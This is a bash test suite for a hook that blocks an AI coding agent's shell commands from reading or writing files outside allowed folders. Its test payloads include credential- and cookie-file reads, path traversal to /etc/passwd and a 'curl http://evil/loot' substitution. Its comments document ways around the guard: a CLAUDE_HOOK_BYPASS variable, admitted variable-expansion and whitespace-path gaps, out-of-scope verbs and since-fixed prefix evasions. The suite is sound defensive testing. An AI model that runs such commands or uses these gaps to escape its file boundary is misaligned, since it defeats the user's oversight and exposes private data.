#!/bin/bash
# tests/block-fs-boundary.test.sh — synthetic Bash-tool payload tests for
# block-fs-boundary.sh. Covers BLOCK-FS-BOUNDARY-001..004 ACs +
# CLAUDE_HOOK_BYPASS bypass + warn-mode + edge cases.
#
# Coverage map: Pass 1 baseline + AC parity for BLOCK-FS-BOUNDARY-001..004.
# Mode gating: tests run hook directly with .mode set to enforce via per-test
# env override (CLAUDE_HOOK_FORCE_MODE not implemented — tests instead exercise
# the natural-state .mode at $HOME/Claude/.claude/hooks/.mode by
# reading it via the hook's own discovery path; tests use isolated MODE_OVERRIDE
# via a temp .mode file when needed via TEST_MODE_FILE pattern).

set -u

HOOK_DIR="$(cd "$(dirname "$0")/.." && pwd -P)"
HOOK="${HOOK_DIR}/block-fs-boundary.sh"

if [ ! -x "$HOOK" ]; then echo "FAIL: hook not executable at $HOOK" >&2; exit 1; fi

PASS=0
FAIL=0

# Save and override .mode for enforce-mode tests (most cases). The hook reads
# .mode at runtime; we set it to enforce here so blocks return exit 2 with a
# BLOCKED stderr message. Restore on exit.
MODE_FILE="${HOOK_DIR}/.mode"
MODE_BACKUP=""
if [ -f "$MODE_FILE" ]; then
  MODE_BACKUP="$(/bin/cat "$MODE_FILE")"
fi

restore_mode() {
  if [ -n "$MODE_BACKUP" ]; then
    /usr/bin/printf '%s' "$MODE_BACKUP" > "$MODE_FILE"
  elif [ -f "$MODE_FILE" ]; then
    /bin/rm -f "$MODE_FILE" 2>/dev/null || true
  fi
}
trap restore_mode EXIT

# Default test mode = enforce (so blocks return exit 2)
/usr/bin/printf 'enforce' > "$MODE_FILE"

test_case() {
  local name="$1"; local payload="$2"; local expected_exit="$3"; local expected_pattern="${4:-}"
  local env_var="${5:-}"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  if [ -n "$env_var" ]; then
    /usr/bin/printf '%s' "$payload" | /usr/bin/env "$env_var" /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  else
    /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  fi
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != "$expected_exit" ] && ok=0
  if [ -n "$expected_pattern" ] && ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "$expected_pattern"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=%s)\n  stderr: %s\n' "$name" "$actual_exit" "$expected_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

# bash_payload <command> [cwd]
bash_payload() {
  local cmd="$1"
  local cwd="${2:-$HOME/Claude/.claude/worktrees/planning}"
  /usr/bin/jq -n --arg cmd "$cmd" --arg cwd "$cwd" \
    '{tool_name: "Bash", tool_input: {command: $cmd}, cwd: $cwd}'
}

echo "================================"
echo "block-fs-boundary.sh tests"
echo "================================"

# ----- BLOCK-FS-BOUNDARY-001: file-read verbs outside allowed roots -----

test_case "cat ~/Documents blocks" \
  "$(bash_payload 'cat ~/Documents/file.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "cat /Users/otheruser blocks" \
  "$(bash_payload 'cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- EXT-POS (#5644): command-start position coverage -----
#
# ANCHOR_PREFIX_BASH saw a command start only at line-start or after `;&|`, so the
# IDENTICAL out-of-boundary read allowed when moved behind an ordinary command prefix or
# into a group. Closed by the shared canonicalizer (core/hooks/lib/command-position.awk).
test_case "EXT-POS-F1: sudo cat outside-root blocks (command-prefix word)" \
  "$(bash_payload 'sudo cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F2: brace group cat outside-root blocks (grouping)" \
  "$(bash_payload '{ cat /Users/otheruser/notes.txt; }')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F3: do-body cat outside-root blocks (compound keyword)" \
  "$(bash_payload 'for f in a; do cat /Users/otheruser/notes.txt; done')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "EXT-POS-F4: escaped verb cat outside-root blocks" \
  "$(bash_payload '\cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# FP guard: shell text carried as quoted content is not a command.
test_case "EXT-FP-F1: quoted outside-root path as message content allows" \
  "$(bash_payload 'git commit -m "cat /Users/otheruser/notes.txt was the bug"')" 0

test_case "head ~/Desktop blocks" \
  "$(bash_payload 'head ~/Desktop/foo.log')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "tail ~/Library/Mail blocks" \
  "$(bash_payload 'tail ~/Library/Mail/inbox')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "base64 ~/Library/Cookies blocks" \
  "$(bash_payload 'base64 ~/Library/Cookies/cookies.db')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "xxd /Users/otheruser blocks" \
  "$(bash_payload 'xxd /Users/otheruser/.bash_history')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "less ~/Pictures blocks" \
  "$(bash_payload 'less ~/Pictures/screenshot.png')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- BLOCK-FS-BOUNDARY-002: file-write verbs outside allowed roots -----

test_case "cp source outside Claude blocks" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" 2 "BLOCK-FS-BOUNDARY-002"

test_case "cp target outside Claude blocks" \
  "$(bash_payload 'cp /tmp/foo ~/Desktop/bar')" 2 "BLOCK-FS-BOUNDARY-002"

test_case "mv source outside Claude blocks" \
  "$(bash_payload 'mv ~/Documents/old.txt /tmp/new.txt')" 2 "BLOCK-FS-BOUNDARY-002"

test_case "tee ~/Desktop target blocks" \
  "$(bash_payload 'tee ~/Desktop/test.txt')" 2 "BLOCK-FS-BOUNDARY-002"

test_case "dd of=~/Desktop target blocks" \
  "$(bash_payload 'dd if=/tmp/foo of='"$HOME"'/Desktop/bar.bin')" 2 "BLOCK-FS-BOUNDARY-002"

# ----- BLOCK-FS-BOUNDARY-003: unresolvable strict-policy -----

# RE-BASELINED BY #5555 — this arm is kept, not removed, because its subject is exactly
# what Policy P changes. `cat $SECRET_FILE` is a bare parameter expansion: no $(, no
# backtick, no \001 sentinel, no `..`, and no decidable literal prefix. It is now G6 —
# ADMITTED with an always-logged -004 advisory record.
#
# This is a REAL surrender of coverage and is the card's documented cost (Stage 5 risk
# RA): `cat "$X"` where $X expands to an out-of-boundary path is admitted where it was
# refused. It is accepted because the refusal could not distinguish that case from the
# 90% of live firings that would have resolved INSIDE an allowed root, and because a
# PreToolUse hook cannot expand $X without executing the command it has not yet approved.
# Every DECIDABLE hostile shape stays refused — see the AC-4/AC-5/AC-6/AC-7/AC-8 arms.
test_case "cat dollar-var → -004 advisory ADMIT (re-baselined by #5555; was -003 block)" \
  "$(bash_payload 'cat $SECRET_FILE')" 0

test_case "cp subshell unresolvable blocks" \
  "$(bash_payload 'cp $(find / -name passwd) /tmp/x')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "tee backtick unresolvable blocks" \
  "$(bash_payload 'tee `echo /etc/hosts`')" 2 "BLOCK-FS-BOUNDARY-003"

# ----- Path-traversal escape (GHSA-9cjm-v22x-4x33 V2) -----
# A literal `..` component escapes an allowed root by prefix-matching BEFORE it
# is collapsed (/tmp/../etc prefix-matches allowed /tmp/ yet resolves to /etc).
# resolve_and_classify now rejects any `..` path-component up front (strict) —
# independent of the python3 normalizer, which previously fell back to the
# un-normalized path when python3 was absent (the second fail-open).
test_case "cat traversal escape blocks (.. token → strict)" \
  "$(bash_payload 'cat /tmp/../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "tee traversal escape blocks (.. token → strict)" \
  "$(bash_payload 'tee /tmp/aaa/../../../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

# ==========================================================================
# POLICY P (#5555) — BLOCK-FS-BOUNDARY-004 and the guard cascade
# ==========================================================================
# The predicate these arms replace was a CHARACTER test, not a SHAPE test: any `$`
# anywhere in an operand returned "unresolvable" and refused. It collapsed three
# epistemic states — decidably-inside, decidably-outside, genuinely undecidable —
# into one refusal, and 90% of its live firings were reads that would have resolved
# INSIDE an allowed root. The cascade below separates them.
#
# Guard order is load-bearing (refuse-before-decide):
#   G0 $XARGS-STDIN · G1 \001 sentinel · G2 $( / backtick · G3 .. / cwd / normalizer
#   · G5 decidable prefix outside · G4 decidable prefix inside · G6 advisory -004

# ----- AC-2: the card's original class — a stdin reader has no file operand -----
# These already passed before Policy P (extract_target_tokens emits nothing for a
# flags-only segment). They are pinned so a future narrowing cannot silently take
# them away. The must-block twin below is what makes their exit-0 non-vacuous.

test_case "AC-2: pipe into head (no file operand) allowed" \
  "$(bash_payload 'git log --oneline | head -n 20')" 0

test_case "AC-2: ps aux | head -5 allowed" \
  "$(bash_payload 'ps aux | head -5')" 0

test_case "AC-2: producer | tail -n 3 allowed" \
  "$(bash_payload 'some-producer | tail -n 3')" 0

test_case "AC-2 CONTROL (must-block twin): cat outside-root still blocks — proves the hook was armed when the zeros above were read" \
  "$(bash_payload 'cat /Users/otheruser/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- AC-3 (G6): the dominant false-positive class is admitted under -004 -----

test_case "AC-3 (G6): cat \"\$SPOKE_OUT/comment.md\" admitted" \
  "$(bash_payload 'cat "$SPOKE_OUT/comment.md"')" 0

test_case "AC-3 (G6): cat \"\$f\" admitted" \
  "$(bash_payload 'cat "$f"')" 0

test_case "AC-3 (G6): tee \"\$SPOKE_OUT/body.md\" admitted (write verb, same policy)" \
  "$(bash_payload 'tee "$SPOKE_OUT/body.md"')" 0

test_case "AC-3 (G6): cat \"\$HOME/Claude/...\" admitted" \
  "$(bash_payload 'cat "$HOME/Claude/pmo-platform/README.md"')" 0

# AC-3 record control: a SILENT allow fails this criterion. -004 must actually log,
# because the always-logged record is what keeps the admitted class measurable (and
# a later narrowing evidence-backed). Counts `rule` lines in the sandbox warn log —
# the log is pretty-printed JSON, so one record contributes exactly one such line.
WARN_LOG_FILE="${HOOK_DIR}/fs-boundary-warn-log.jsonl"
_adv_before=0
if [ -f "$WARN_LOG_FILE" ]; then
  _adv_before="$(/usr/bin/grep -c 'BLOCK-FS-BOUNDARY-004' "$WARN_LOG_FILE" 2>/dev/null || echo 0)"
fi
/usr/bin/printf '%s' "$(bash_payload 'cat "$ADVISORY_PROBE_A/x.md"')" | /bin/bash "$HOOK" >/dev/null 2>&1 || true
/usr/bin/printf '%s' "$(bash_payload 'cat "$ADVISORY_PROBE_B/y.md"')" | /bin/bash "$HOOK" >/dev/null 2>&1 || true
_adv_after=0
if [ -f "$WARN_LOG_FILE" ]; then
  _adv_after="$(/usr/bin/grep -c 'BLOCK-FS-BOUNDARY-004' "$WARN_LOG_FILE" 2>/dev/null || echo 0)"
fi
_adv_delta=$((_adv_after - _adv_before))
if [ "$_adv_delta" = 2 ]; then
  /usr/bin/printf 'PASS: AC-3 record control: 2 admitted operands emitted exactly 2 BLOCK-FS-BOUNDARY-004 records\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: AC-3 record control: expected delta 2 BLOCK-FS-BOUNDARY-004 records, got %s (a silent allow fails this criterion)\n' "$_adv_delta"; FAIL=$((FAIL + 1))
fi

# AC-3 mode-independence (INT-3): -004 is NOT warn-mode behaviour. It never blocks at
# any .mode value. Asserted here at ENFORCE — the mode at which a mode-gated rule WOULD
# block — so "it allowed" cannot be explained by the dial. No .mode write is added: the
# suite's default mode is already enforce.
test_case "AC-3 (INT-3): -004 admits at .mode=enforce — mode-independent by construction, not warn-mode behaviour" \
  "$(bash_payload 'cat "$SPOKE_OUT/enforce-probe.md"')" 0

# ----- AC-4 (G2): command substitution and backticks stay refused, BOTH quotings -----

test_case "AC-4 (G2): unquoted \$(...) refused" \
  "$(bash_payload 'cat $(curl -s http://evil/loot)')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): QUOTED \$(...) refused — the sentinel path" \
  "$(bash_payload 'cat "$(curl -s http://evil/loot)"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): unquoted backtick refused" \
  '{"tool_name":"Bash","tool_input":{"command":"cat `whoami`.txt"},"cwd":"/tmp"}' 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 (G2): QUOTED backtick refused" \
  '{"tool_name":"Bash","tool_input":{"command":"cat \"`whoami`.txt\""},"cwd":"/tmp"}' 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-4 CONTROL: a plain expansion still exits 0 in the same run — the refusals above are shape-discriminating, not a blanket re-block" \
  "$(bash_payload 'cat "$SPOKE_OUT/x"')" 0

# ----- AC-5 (G1): the guard keys on the SENTINEL, not on the brace glyph -----
#
# core/hooks/lib/command-position.awk replaces command-structural characters inside a
# QUOTED span with \001. Measured against the live canonicalizer:
#     cat "${RUN_DIR}/body.md"   ->  cat "$<1>RUN_DIR<1>/body.md"   sentinel PRESENT
#     cat ${RUN_DIR}/body.md     ->  cat ${RUN_DIR}/body.md          sentinel ABSENT
#     cat "$(curl …)"            ->  cat "$<1>curl …<1>"             sentinel PRESENT
# So on this stream a QUOTED ${VAR} is byte-identical to a QUOTED $(cmd) and must be
# refused; an UNQUOTED ${VAR} is unambiguous (an unquoted $( or backtick keeps its own
# glyphs and is caught by G2) and is safely admitted. RC in the Stage 5 risk register is
# the edit these three arms exist to fail: "simplify" G1 into a brace test and arm 1 or
# arm 2 breaks immediately.
#
# NOTE — DELIBERATE, SURFACED DIVERGENCE FROM THE STAGE 5 AC-5 TEXT. AC-5's parenthetical
# control arm says the unquoted form "also exits 2". That contradicts (a) the same spec's
# implementation note, which defines an expansion span as "$NAME, $1/$@/$#-class, or an
# UNQUOTED ${…}", and (b) AC-5's own stated purpose — if both quoted and unquoted braces
# refused, the guard would be keying on the brace glyph, which that sentence explicitly
# denies. Implemented to the security-correct reading. Measured: this choice moves the
# AC-1 residual by 23/5040 records (8.93% vs 9.38%) — both under the 10% threshold, so
# the threshold does not force the answer and the divergence is a security judgment.

test_case "AC-5 (G1): QUOTED \${...} refused — sentinel-bearing, indistinguishable from \$(...)" \
  "$(bash_payload 'cat "${RUN_DIR}/body.md"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-5 (G1 discriminator): UNQUOTED \${...} admitted — same brace glyph, no sentinel" \
  "$(bash_payload 'cat ${RUN_DIR}/body.md')" 0

test_case "AC-5 (G1 discriminator): quoted \$NAME with no brace admitted" \
  "$(bash_payload 'cat "$RUN_DIR/body.md"')" 0

# ----- AC-6 (G3): traversal + normalizer self-check unchanged -----

test_case "AC-6 (G3): .. inside a literal span of an expansion-bearing operand refused" \
  "$(bash_payload 'cat "$X/../../../../etc/passwd"')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-6 (G3): bare relative traversal refused" \
  "$(bash_payload 'cat ../../../../etc/passwd')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-6 CONTROL: an in-root literal read still exits 0" \
  "$(bash_payload 'cat /tmp/ok.txt')" 0

# ----- AC-7 (G4/G5): the decidable-prefix split -----
# G5's live count in the frozen population is 1, so this AC is graded almost entirely on
# synthetic arms — which is the point of asserting it. G5 refuses under -001/-002, NOT
# -003, and the message must identify the resolved path as a PREFIX: telling an operator
# a path resolved when only its prefix did is the failure mode that wording prevents.

test_case "AC-7 (G4): decidable literal prefix INSIDE an allowed root → allowed" \
  "$(bash_payload 'cat '"$HOME"'/Claude/$P/f.txt')" 0

test_case "AC-7 (G5): decidable literal prefix OUTSIDE all roots → -001, not -003" \
  "$(bash_payload 'cat /etc/$X')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "AC-7 (G5): other-user home prefix → -001, not -003" \
  "$(bash_payload 'cat /Users/otheruser/$X/notes.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "AC-7 (G5): the -001 message identifies the resolved path as a PREFIX" \
  "$(bash_payload 'cat /etc/$X')" 2 "decidable literal prefix"

# ----- AC-8 (G0): the xargs carve-out -----
# The canonicalizer routes an xargs denial THROUGH the unresolvable branch, emitting the
# literal token `$XARGS-STDIN` (verified live: `find . -name "*.md" | xargs cat` ->
# `find . -name "*.md" | xargs ; cat $XARGS-STDIN`). A naive "leading expansion → allow"
# rule would parse that as $XARGS + literal "-STDIN", find an empty prefix, and ADMIT it —
# silently disabling the denial with no other arm noticing. G0 is ordered ahead of the
# $NAME parser for exactly this reason, and this arm is what proves the ordering holds.

test_case "AC-8 (G0): xargs-fed verb refused — the stdin sentinel is not a parameter expansion" \
  "$(bash_payload 'find . -name "*.md" | xargs cat')" 2 "BLOCK-FS-BOUNDARY-003"

test_case "AC-8 CONTROL: the pipe itself is not what is refused" \
  "$(bash_payload 'find . -name "*.md" | head -5')" 0

# ----- D-3: sentinel-safe message rendering -----
# The 286 sentinel-bearing operands previously emitted a raw \001 control byte to the
# operator, displaying as a corrupted path. The message now renders a readable marker.

test_case "D-3: sentinel rendered readably in the -003 message (no raw control byte)" \
  "$(bash_payload 'cat "${RUN_DIR}/body.md"')" 2 "<quoted-expansion>"

# ----- Allowed roots — should pass (exit 0) -----

test_case "cat inside Claude allowed" \
  "$(bash_payload 'cat '"$HOME"'/Claude/CLAUDE.md')" 0

test_case "cat relative inside workspace allowed (cwd is workspace)" \
  "$(bash_payload 'cat README.md' ''"$HOME"'/Claude')" 0

test_case "cp inside Claude allowed" \
  "$(bash_payload 'cp '"$HOME"'/Claude/CLAUDE.md /tmp/c.bak')" 0

test_case "cat /tmp/foo allowed" \
  "$(bash_payload 'cat /tmp/foo')" 0

test_case "cat ~/Downloads allowed (operator-confirmed root)" \
  "$(bash_payload 'cat ~/Downloads/install.dmg.txt')" 0

test_case "cat ~/.claude config allowed" \
  "$(bash_payload 'cat ~/.claude/settings.json')" 0

# NOTE: Cowork install path contains "Application Support" with a space.
# Per documented v1 limitation (whitespace-tokenization shared with
# block-rm-prefer-trash.sh), unquoted paths-with-spaces tokenize into
# `$HOME/Library/Application` (blocked) plus
# `Support/...` (orphan token, skipped). Real-world Cowork access flows
# through `./deploy.sh --deploy` which is on the script-execution allowlist;
# the internal `cp` calls happen inside the script's bash subprocess and
# the hook never sees them. Direct unquoted cat of paths-with-spaces is
# accepted v1 residual per bypass-mode-readiness.md § Known Limitations.
test_case "Cowork install path quoted-form blocks (v1 limitation — unquoted whitespace path tokenizes)" \
  "$(bash_payload 'cat '"$HOME"'/Library/Application Support/Claude/local-agent-mode-sessions/foo/skills/daily-status/SKILL.md')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- Verbs that are NOT in v1 scope — should pass through (out-of-scope = allow) -----

test_case "grep not in v1 scope — allowed (out of scope by design)" \
  "$(bash_payload 'grep secret ~/Documents/file.txt')" 0

test_case "find not in v1 scope — allowed" \
  "$(bash_payload 'find ~/Documents -type f')" 0

test_case "ls not in v1 scope — allowed" \
  "$(bash_payload 'ls ~/Documents')" 0

# ----- Non-Bash tool calls — early exit -----

test_case "Read tool early exit" \
  '{"tool_name": "Read", "tool_input": {"file_path": "$HOME/Documents/foo"}}' 0

test_case "Edit tool early exit" \
  '{"tool_name": "Edit", "tool_input": {"file_path": "$HOME/Desktop/foo"}}' 0

# ----- CLAUDE_HOOK_BYPASS escape hatch -----

test_case "bypass env var allows blocked cat" \
  "$(bash_payload 'cat ~/Documents/foo')" 0 "" "CLAUDE_HOOK_BYPASS=1"

test_case "bypass env var allows blocked cp" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')" 0 "" "CLAUDE_HOOK_BYPASS=1"

# ----- Absolute-path-aware verb anchor -----

test_case "/bin/cat outside Claude blocks (absolute-path-aware)" \
  "$(bash_payload '/bin/cat ~/Documents/file.txt')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "/usr/bin/cp outside Claude blocks (absolute-path-aware)" \
  "$(bash_payload '/usr/bin/cp ~/Desktop/foo /tmp/bar')" 2 "BLOCK-FS-BOUNDARY-002"

# ----- Chained-command tokenizer (F1 split) -----

test_case "ls && cat ~/Documents blocks (chained)" \
  "$(bash_payload 'ls && cat ~/Documents/foo')" 2 "BLOCK-FS-BOUNDARY-001"

test_case "echo hi; cat ~/Desktop blocks (chained)" \
  "$(bash_payload 'echo hi; cat ~/Desktop/foo')" 2 "BLOCK-FS-BOUNDARY-001"

# ----- Warn-mode behavior (.mode = warn → exit 0 with WARN log) -----

test_warn_case() {
  local name="$1"; local payload="$2"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf 'warn' > "$MODE_FILE"
  /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  local actual_stderr; actual_stderr="$(/bin/cat "$tmp_stderr")"; /bin/rm -f "$tmp_stderr"
  local ok=1
  [ "$actual_exit" != 0 ] && ok=0
  if ! /usr/bin/printf '%s' "$actual_stderr" | /usr/bin/grep -qE "WARN"; then ok=0; fi
  if [ "$ok" = 1 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=0 with WARN in stderr)\n  stderr: %s\n' "$name" "$actual_exit" "$actual_stderr"
    FAIL=$((FAIL + 1))
  fi
}

test_warn_case "warn-mode cat ~/Documents emits WARN exit 0" \
  "$(bash_payload 'cat ~/Documents/foo')"

test_warn_case "warn-mode cp source outside emits WARN exit 0" \
  "$(bash_payload 'cp ~/Documents/foo /tmp/bar')"

# ----- Off-mode behavior (.mode = off → exit 0 silently) -----

test_off_case() {
  local name="$1"; local payload="$2"
  local tmp_stderr; tmp_stderr="$(/usr/bin/mktemp)"
  local actual_exit=0
  /usr/bin/printf 'off' > "$MODE_FILE"
  /usr/bin/printf '%s' "$payload" | /bin/bash "$HOOK" 2>"$tmp_stderr" >/dev/null || actual_exit="$?"
  /usr/bin/printf 'enforce' > "$MODE_FILE"
  /bin/rm -f "$tmp_stderr"
  if [ "$actual_exit" = 0 ]; then
    /usr/bin/printf 'PASS: %s\n' "$name"; PASS=$((PASS + 1))
  else
    /usr/bin/printf 'FAIL: %s (exit=%s expected=0)\n' "$name" "$actual_exit"
    FAIL=$((FAIL + 1))
  fi
}

test_off_case "off-mode cat ~/Documents silently allowed" \
  "$(bash_payload 'cat ~/Documents/foo')"

# ----- Empty/no-target commands — allow -----

test_case "bare cat with no args allowed" \
  "$(bash_payload 'cat')" 0

test_case "cat with all flags (no targets) allowed" \
  "$(bash_payload 'cat -n')" 0

# ----- Missing-jq dependency gate (GHSA-9cjm-v22x-4x33 regression) -----
# jq resolution now lives in the shared helper lib/dep-resolve.sh, so simulating
# missing jq requires sandboxing BOTH files: a copy of the hook plus a copy of
# the helper with all three jq candidate paths rewritten to nonexistent
# locations. This hook is mode-gated: a control that cannot parse its input must
# DENY in enforce mode (exit 2) and DEGRADE (exit 0, never block harder than a
# rule match) in warn mode.
_sb="$(/usr/bin/mktemp -d)"
/bin/mkdir -p "$_sb/lib"
/bin/cp "$HOOK" "$_sb/block-fs-boundary.sh"; /bin/chmod +x "$_sb/block-fs-boundary.sh"
/usr/bin/sed \
  -e 's#/usr/bin/jq#/nonexistent/jq-a#g' \
  -e 's#/opt/homebrew/bin/jq#/nonexistent/jq-b#g' \
  -e 's#/usr/local/bin/jq#/nonexistent/jq-c#g' \
  "${HOOK_DIR}/lib/dep-resolve.sh" > "$_sb/lib/dep-resolve.sh"
_sb_hook="$_sb/block-fs-boundary.sh"
_sb_payload='{"tool_name":"Bash","tool_input":{"command":"cat /tmp/foo"},"cwd":"/tmp"}'

# enforce mode → fail CLOSED (exit 2 + DEPENDENCY-MISSING)
/usr/bin/printf 'enforce' > "$_sb/.mode"
_jqmiss_exit=0
_jqmiss_err="$(/usr/bin/printf '%s' "$_sb_payload" | /bin/bash "$_sb_hook" 2>&1 >/dev/null)" || _jqmiss_exit="$?"
if [ "$_jqmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_jqmiss_err" | /usr/bin/grep -qE 'DEPENDENCY-MISSING'; then
  /usr/bin/printf 'PASS: jq missing (enforce) → fail CLOSED (exit 2 + DEPENDENCY-MISSING)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: jq missing (enforce) → expected exit 2 + DEPENDENCY-MISSING, got exit=%s\n  stderr: %s\n' "$_jqmiss_exit" "$_jqmiss_err"; FAIL=$((FAIL + 1))
fi

# warn mode → DEGRADE (exit 0 + DEPENDENCY-DEGRADED); must not block harder than a match
/usr/bin/printf 'warn' > "$_sb/.mode"
_jqwarn_exit=0
_jqwarn_err="$(/usr/bin/printf '%s' "$_sb_payload" | /bin/bash "$_sb_hook" 2>&1 >/dev/null)" || _jqwarn_exit="$?"
if [ "$_jqwarn_exit" = 0 ] && /usr/bin/printf '%s' "$_jqwarn_err" | /usr/bin/grep -qE 'DEPENDENCY-DEGRADED'; then
  /usr/bin/printf 'PASS: jq missing (warn) → degrade (exit 0 + DEPENDENCY-DEGRADED)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: jq missing (warn) → expected exit 0 + DEPENDENCY-DEGRADED, got exit=%s\n  stderr: %s\n' "$_jqwarn_exit" "$_jqwarn_err"; FAIL=$((FAIL + 1))
fi
/bin/rm -rf "$_sb"

# ----- Missing dependency helper → fail CLOSED (GHSA-9cjm-v22x-4x33) -----
# If lib/dep-resolve.sh is unreadable, bash 3.2 exits 1 on the failed source
# (non-blocking) — the readability guard converts that to a blocking exit 2.
_sb2="$(/usr/bin/mktemp -d)"
/bin/cp "$HOOK" "$_sb2/block-fs-boundary.sh"; /bin/chmod +x "$_sb2/block-fs-boundary.sh"
/usr/bin/printf 'enforce' > "$_sb2/.mode"   # no $_sb2/lib/dep-resolve.sh created
_libmiss_exit=0
_libmiss_err="$(/usr/bin/printf '%s' '{"tool_name":"Bash","tool_input":{"command":"cat /tmp/foo"},"cwd":"/tmp"}' | /bin/bash "$_sb2/block-fs-boundary.sh" 2>&1 >/dev/null)" || _libmiss_exit="$?"
/bin/rm -rf "$_sb2"
if [ "$_libmiss_exit" = 2 ] && /usr/bin/printf '%s' "$_libmiss_err" | /usr/bin/grep -qE 'LIB-MISSING'; then
  /usr/bin/printf 'PASS: dep helper missing → fail CLOSED (exit 2 + LIB-MISSING)\n'; PASS=$((PASS + 1))
else
  /usr/bin/printf 'FAIL: dep helper missing → expected exit 2 + LIB-MISSING, got exit=%s\n  stderr: %s\n' "$_libmiss_exit" "$_libmiss_err"; FAIL=$((FAIL + 1))
fi

# ----- Summary -----

echo ""
echo "================================"
TOTAL=$((PASS + FAIL))
/usr/bin/printf 'Total: %s  PASS: %s  FAIL: %s\n' "$TOTAL" "$PASS" "$FAIL"
echo "================================"

if [ "$FAIL" -gt 0 ]; then exit 1; fi
exit 0
